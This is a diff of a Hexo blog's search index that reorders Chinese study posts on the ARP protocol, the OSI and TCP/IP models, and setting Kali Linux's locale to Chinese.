@@ -1,100 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ARP协议原理与应用</title>
-    <url>/posts/9f9ac9a/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>OSI模型把网络工作分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接打交道。在 通过以太网发送IP数据包时，需要先封装第三层、第二层的包头，但由于发送时只知道目标IP地址，不知 道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议即ARP协议。</li>
-<li>ARP协议可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信 的顺利进行。</li>
-</ul>
-<h2 id="ARP协议概述"><a href="#ARP协议概述" class="headerlink" title="ARP协议概述"></a>ARP协议概述</h2><ul>
-<li>数据要在以太网中传输，需要完成以太网封装，这项工作由网络层负责；</li>
-<li>要完成以太网的数据封装，需要知道目的设备的MAC地址；</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105555.png" alt="1" loading="lazy"></p>
-<ul>
-<li>ARP <ul>
-<li>Address Resolution Protocol 地址解析协 议</li>
-<li>作用：将 IP地址解析为 MAC地址</li>
-<li>注意：ARP报文不能穿越路由器，不能被转 发到其他广播域</li>
-</ul>
-</li>
-<li>ARP缓存表<ul>
-<li>用于存储IP地址及其经过解析的MAC地址的 对应关系</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105558.png" alt="2" loading="lazy"></p>
-<h2 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h2><p>ARP工作流程</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105601.png" alt="3" loading="lazy"></p>
-<p>ARP工作原理</p>
-<ul>
-<li>先查看ARP表，如果ARP表中没有目的IP地址对应的MAC表项，则发送ARP请求包；</li>
-<li>源主机广播发送ARP request 数据包，请求目的主机的MAC地址；</li>
-<li>同网段内的所有主机都能收到ARP request请求包，但只有目的主机才会回复ARP reply数据包；</li>
-<li>源主机收到ARP reply后，将目的主句的IP-MAC对应关系添加进ARP表中，完成数据的以太网封装，进行 数据交互</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105604.png" alt="4" loading="lazy"></p>
-<p>ARP缓存表</p>
-<ul>
-<li>动态表项<ul>
-<li>通过ARP协议学习，能被更新，缺省老化时间120s</li>
-</ul>
-</li>
-<li>静态表项<ul>
-<li>手工配置，不能被更新，无老化时间的限制</li>
-</ul>
-</li>
-</ul>
-<p>ARP协议分类</p>
-<p>免费ARP（Gratuitous ARP ）</p>
-<ul>
-<li>发送ARP请求，请求本机IP对应的MAC <ul>
-<li>免费ARP的作用：确定其它设备的 IP地址是否与本机 IP地址冲突 </li>
-<li>更改了地址，通知其他设备更新 ARP表项</li>
-</ul>
-</li>
-</ul>
-<p>代理ARP（Proxy ARP ）</p>
-<ul>
-<li>由启动了代理ARP功能的网关&#x2F;下一跳设备代为应答ARP请求，该ARP请求的是其他IP对应的MAC地址。</li>
-<li>回应ARP请求的条件<ul>
-<li>本地有去往目的IP的路由表 </li>
-<li>收到该ARP请求的接口与路由表下一跳不是同一个接口</li>
-</ul>
-</li>
-</ul>
-<p>RARP与IARP</p>
-<ul>
-<li>RARP  Reverse Address Resolution Protocol 反向地址解析协议 <ul>
-<li>把MAC地址解析为IP地址 </li>
-<li>应用场景：常用于无盘工作站</li>
-</ul>
-</li>
-<li>IARP <ul>
-<li>Inverse Address Resolution Protocol 逆向地址解析协议 </li>
-<li>在帧中继网络中解析对端IP地址和本地DLCL的映射关系</li>
-<li>应用场景：应用于帧中继网络</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AC双热机备份</title>
     <url>/posts/50b45d5b/</url>
     <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615151950.png" alt="image-20220615151949929" loading="lazy"></p>
@@ -649,6 +555,100 @@ option 43 sub-option 3 ascii 10.1.201.3
       </categories>
       <tags>
         <tag>eNSP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ARP协议原理与应用</title>
+    <url>/posts/9f9ac9a/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>OSI模型把网络工作分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接打交道。在 通过以太网发送IP数据包时，需要先封装第三层、第二层的包头，但由于发送时只知道目标IP地址，不知 道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议即ARP协议。</li>
+<li>ARP协议可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信 的顺利进行。</li>
+</ul>
+<h2 id="ARP协议概述"><a href="#ARP协议概述" class="headerlink" title="ARP协议概述"></a>ARP协议概述</h2><ul>
+<li>数据要在以太网中传输，需要完成以太网封装，这项工作由网络层负责；</li>
+<li>要完成以太网的数据封装，需要知道目的设备的MAC地址；</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105555.png" alt="1" loading="lazy"></p>
+<ul>
+<li>ARP <ul>
+<li>Address Resolution Protocol 地址解析协 议</li>
+<li>作用：将 IP地址解析为 MAC地址</li>
+<li>注意：ARP报文不能穿越路由器，不能被转 发到其他广播域</li>
+</ul>
+</li>
+<li>ARP缓存表<ul>
+<li>用于存储IP地址及其经过解析的MAC地址的 对应关系</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105558.png" alt="2" loading="lazy"></p>
+<h2 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h2><p>ARP工作流程</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105601.png" alt="3" loading="lazy"></p>
+<p>ARP工作原理</p>
+<ul>
+<li>先查看ARP表，如果ARP表中没有目的IP地址对应的MAC表项，则发送ARP请求包；</li>
+<li>源主机广播发送ARP request 数据包，请求目的主机的MAC地址；</li>
+<li>同网段内的所有主机都能收到ARP request请求包，但只有目的主机才会回复ARP reply数据包；</li>
+<li>源主机收到ARP reply后，将目的主句的IP-MAC对应关系添加进ARP表中，完成数据的以太网封装，进行 数据交互</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105604.png" alt="4" loading="lazy"></p>
+<p>ARP缓存表</p>
+<ul>
+<li>动态表项<ul>
+<li>通过ARP协议学习，能被更新，缺省老化时间120s</li>
+</ul>
+</li>
+<li>静态表项<ul>
+<li>手工配置，不能被更新，无老化时间的限制</li>
+</ul>
+</li>
+</ul>
+<p>ARP协议分类</p>
+<p>免费ARP（Gratuitous ARP ）</p>
+<ul>
+<li>发送ARP请求，请求本机IP对应的MAC <ul>
+<li>免费ARP的作用：确定其它设备的 IP地址是否与本机 IP地址冲突 </li>
+<li>更改了地址，通知其他设备更新 ARP表项</li>
+</ul>
+</li>
+</ul>
+<p>代理ARP（Proxy ARP ）</p>
+<ul>
+<li>由启动了代理ARP功能的网关&#x2F;下一跳设备代为应答ARP请求，该ARP请求的是其他IP对应的MAC地址。</li>
+<li>回应ARP请求的条件<ul>
+<li>本地有去往目的IP的路由表 </li>
+<li>收到该ARP请求的接口与路由表下一跳不是同一个接口</li>
+</ul>
+</li>
+</ul>
+<p>RARP与IARP</p>
+<ul>
+<li>RARP  Reverse Address Resolution Protocol 反向地址解析协议 <ul>
+<li>把MAC地址解析为IP地址 </li>
+<li>应用场景：常用于无盘工作站</li>
+</ul>
+</li>
+<li>IARP <ul>
+<li>Inverse Address Resolution Protocol 逆向地址解析协议 </li>
+<li>在帧中继网络中解析对端IP地址和本地DLCL的映射关系</li>
+<li>应用场景：应用于帧中继网络</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -2016,35 +2016,6 @@ Ruijie(config-time-range)#periodic weekdays 9:00 to 18:00</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Kali-Linux设置为中文</title>
-    <url>/posts/5e07eda7/</url>
-    <content><![CDATA[<ol>
-<li><p>打开终端输入sudo su进入管理员界面</p>
-</li>
-<li><p>输入 dpkg-reconfigure locales  进入软件包设置</p>
-<p> <img src="https://s3.bmp.ovh/imgs/2022/03/1a0bcfc366efca72.png" loading="lazy"></p>
-</li>
-<li><p>用上下键将光标移至“zh_CN.UTF-8 UTF-8”项按空格键选择后回车</p>
-</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/3b0c73b054b762f5.png" loading="lazy"></p>
-<ol start="4">
-<li>将光标移至“zh_CN.UTF-8 UTF-8”点击“ok”</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/8172a8edacb35ce2.png" loading="lazy"></p>
-<ol start="5">
-<li>等待系统设置；完成后输入 reboot 重启</li>
-</ol>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NAT技术介绍</title>
     <url>/posts/59d20ca5/</url>
     <content><![CDATA[<div class="danger">
@@ -2386,337 +2357,32 @@ tcp 100.1.1.100:23 192.168.1.3:23 100.1.1.1:1026 100.1.1.1:1026</code></pre></li
       </tags>
   </entry>
   <entry>
-    <title>OSI参考模型及TCP/IP协议栈</title>
-    <url>/posts/7e4a66b0/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-
-
-
-<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
-<li>为什么使用分层结构<ul>
-<li>降低复杂性</li>
-<li>提高设备的兼容性</li>
-<li>提供标准化接口</li>
-<li>促进模块化工作</li>
-<li>简化教学和学习</li>
-<li>易于实现与维护</li>
-</ul>
+    <title>Kali-Linux设置为中文</title>
+    <url>/posts/5e07eda7/</url>
+    <content><![CDATA[<ol>
+<li><p>打开终端输入sudo su进入管理员界面</p>
 </li>
-<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
-</ul>
-<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
-<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
-<thead>
-<tr>
-<th>OSI参考模型层次</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>应用层</td>
-<td>提供应用程序间通讯</td>
-<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
-</tr>
-<tr>
-<td>表示层</td>
-<td>数据表示、加密、解密</td>
-<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
-</tr>
-<tr>
-<td>会话层</td>
-<td>会话建立维护</td>
-<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
-</tr>
-<tr>
-<td>传输层</td>
-<td>建立主机端到端链接</td>
-<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>寻址和路由</td>
-<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
-</tr>
-<tr>
-<td>数据链路层</td>
-<td>介质访问、链路管理</td>
-<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
-</tr>
-<tr>
-<td>物理层</td>
-<td>二进制传输</td>
-<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
-</tr>
-</tbody></table>
-<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
-<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
-<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
+<li><p>输入 dpkg-reconfigure locales  进入软件包设置</p>
+<p> <img src="https://s3.bmp.ovh/imgs/2022/03/1a0bcfc366efca72.png" loading="lazy"></p>
 </li>
-<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
+<li><p>用上下键将光标移至“zh_CN.UTF-8 UTF-8”项按空格键选择后回车</p>
 </li>
-<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
-<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
-<li>TCP&#x2F;IP总共定义了4层</li>
-<li>OSI的1、2层合并为网络接入层 </li>
-<li>OSI的5、6、7层合并为网络应用层 </li>
-<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
-<li>TCP&#x2F;IP模型是Internet的基本协</li>
-</ul>
-<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
-<thead>
-<tr>
-<th>TCP&#x2F;IP</th>
-<th>OSI</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>应用层</td>
-<td>应用层<br>表示层<br>会话层</td>
-</tr>
-<tr>
-<td>传输层</td>
-<td>传输层</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>网络层</td>
-</tr>
-<tr>
-<td>网络接入层</td>
-<td>数据链路层 <br> 物理层</td>
-</tr>
-</tbody></table>
-<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
-<ul>
-<li>网络应用<ul>
-<li>微博、微信、QQ……</li>
-</ul>
-</li>
-<li>邮件服务（SMTP、POP3）<ul>
-<li>Outlook、新浪邮箱……</li>
-</ul>
-</li>
-<li>网页服务（http、https）<ul>
-<li>百度、搜狐、网易</li>
-</ul>
-</li>
-<li>网络管理<ul>
-<li>SNMP</li>
-</ul>
-</li>
-<li>远程登陆<ul>
-<li>Telnet、ssh</li>
-</ul>
-</li>
-<li>地址服务<ul>
-<li><pre><code>DNS、DHCP
-</code></pre>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
-<ul>
-<li>基于TCP的协议，可靠传输、有重传机制<ul>
-<li>FTP、SMTP、Telnet、HTTP</li>
-</ul>
-</li>
-<li>基于UDP的协议传输，不可靠、效率高<ul>
-<li>TFTP、SNMP、DHCP</li>
-</ul>
-</li>
-</ul>
-<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
-<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
-<li><p>提供主机到主机的传输服务</p>
-</li>
-<li><p>IP</p>
-<ul>
-<li>提供主机到主机的传输服务</li>
-</ul>
-</li>
-<li><p>ICMP</p>
-<ul>
-<li>辅助IP工作,提供出错和控制信息</li>
-</ul>
-</li>
-<li><p>ARP</p>
-<ul>
-<li>解析IP与MAC的映射</li>
-</ul>
-</li>
-</ul>
-<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
-<li><p>在相邻节点提供数据传输服务</p>
-</li>
-<li><p>局域网</p>
-<ul>
-<li>IEEE802.2	定义LLC子层</li>
-<li>IEEE802.3 	以太网标准</li>
-</ul>
-</li>
-<li><p>广域网</p>
-<ul>
-<li>HDLC(高级数据链路控)协议)</li>
-<li>PPP(点对点协议,类别:数据链路层协议)</li>
-<li>Frame Relay(帧中继)</li>
-</ul>
-</li>
-</ul>
-<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>FTP</td>
-<td>21</td>
-<td>HTTP</td>
-<td>80</td>
-<td>SMTP</td>
-<td>25</td>
-</tr>
-<tr>
-<td>FT-daada</td>
-<td>20</td>
-<td>HTTPS</td>
-<td>443</td>
-<td>POP3</td>
-<td>110</td>
-</tr>
-<tr>
-<td>Telnet</td>
-<td>23</td>
-<td>SQL</td>
-<td>１４３３</td>
-<td>Tacacs＋</td>
-<td>４９</td>
-</tr>
-<tr>
-<td>SSH</td>
-<td>２２</td>
-<td>Oracle</td>
-<td>１５２１</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
-<thead>
-<tr>
-<th align="center">协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">DHCP</td>
-<td>67、68</td>
-<td>Radius</td>
-<td>1812、1813</td>
-<td>WINS</td>
-<td>42</td>
-</tr>
-<tr>
-<td align="center">TFTP</td>
-<td>69</td>
-<td>NTP</td>
-<td>123</td>
-<td>NETBIOS</td>
-<td>137、138、139</td>
-</tr>
-<tr>
-<td align="center">SNMP</td>
-<td>１６１、１６２</td>
-<td>RIP</td>
-<td>５２０</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
-<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
-<li>常用在视频、语音应用等</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
-<ul>
-<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
-<ul>
-<li>常用在HTTP、FTP等可靠传输</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
-<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
-<li><p>基于TCP协议</p>
-<ul>
-<li>传输数据前:由TCP建立连接</li>
-<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
-<li>传输结束后：由TCP拆除链接</li>
-</ul>
-</li>
-<li><p>TCP头部字段</p>
-<ul>
-<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
-</ul>
-</li>
-<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
-<ul>
-<li>窗口大小:传输阶段每次连续发送数据的大小</li>
-</ul>
-</li>
-<li><p>Flag字段:</p>
-<ul>
-<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
-<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
-</ul>
-</li>
-<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
-<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
-<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
-<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
-<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
-<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
-<p>发送方将根据确认号，进行数据重传</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
-<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/3b0c73b054b762f5.png" loading="lazy"></p>
+<ol start="4">
+<li>将光标移至“zh_CN.UTF-8 UTF-8”点击“ok”</li>
+</ol>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/8172a8edacb35ce2.png" loading="lazy"></p>
+<ol start="5">
+<li>等待系统设置；完成后输入 reboot 重启</li>
+</ol>
 ]]></content>
       <categories>
-        <category>学习</category>
-        <category>锐捷</category>
+        <category>教程</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>锐捷</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -3208,6 +2874,340 @@ Ping statistics for 10.3.0.1:
 Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
 Approximate round trip times in milli-seconds:
 Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OSI参考模型及TCP/IP协议栈</title>
+    <url>/posts/7e4a66b0/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+
+<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
+<li>为什么使用分层结构<ul>
+<li>降低复杂性</li>
+<li>提高设备的兼容性</li>
+<li>提供标准化接口</li>
+<li>促进模块化工作</li>
+<li>简化教学和学习</li>
+<li>易于实现与维护</li>
+</ul>
+</li>
+<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
+</ul>
+<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
+<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
+<thead>
+<tr>
+<th>OSI参考模型层次</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>提供应用程序间通讯</td>
+<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
+</tr>
+<tr>
+<td>表示层</td>
+<td>数据表示、加密、解密</td>
+<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
+</tr>
+<tr>
+<td>会话层</td>
+<td>会话建立维护</td>
+<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>建立主机端到端链接</td>
+<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>寻址和路由</td>
+<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td>介质访问、链路管理</td>
+<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
+</tr>
+<tr>
+<td>物理层</td>
+<td>二进制传输</td>
+<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
+</tr>
+</tbody></table>
+<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
+<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
+<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
+</li>
+<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
+</li>
+<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
+<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
+<li>TCP&#x2F;IP总共定义了4层</li>
+<li>OSI的1、2层合并为网络接入层 </li>
+<li>OSI的5、6、7层合并为网络应用层 </li>
+<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
+<li>TCP&#x2F;IP模型是Internet的基本协</li>
+</ul>
